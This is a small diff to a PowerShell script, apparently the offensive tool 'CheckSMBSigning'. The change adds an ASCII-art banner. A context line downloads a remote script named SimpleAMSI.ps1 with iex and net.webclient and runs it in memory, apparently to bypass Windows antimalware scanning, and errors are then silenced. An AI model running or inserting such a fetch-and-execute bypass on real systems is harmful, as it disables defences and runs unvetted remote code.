@@ -1,3 +1,11 @@
+Write-Host "   ____ _               _     ____  __  __ ____ ____  _             _             "
+Write-Host "  / ___| |__   ___  ___| | __/ ___||  \/  | __ ) ___|(_) __ _ _ __ (_)_ __   __ _ "
+Write-Host " | |   | '_ \ / _ \/ __| |/ /\___ \| |\/| |  _ \___ \| |/ _` | '_ \| | '_ \ / _` |"
+Write-Host " | |___| | | |  __/ (__|   <  ___) | |  | | |_) |__) | | (_| | | | | | | | | (_| |"
+Write-Host "  \____|_| |_|\___|\___|_|\_\|____/|_|  |_|____/____/|_|\__, |_| |_|_|_| |_|\__, |"
+Write-Host "                                                        |___/               |___/ "
+Write-Host ""
+
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
 $ErrorActionPreference = "SilentlyContinue"
 
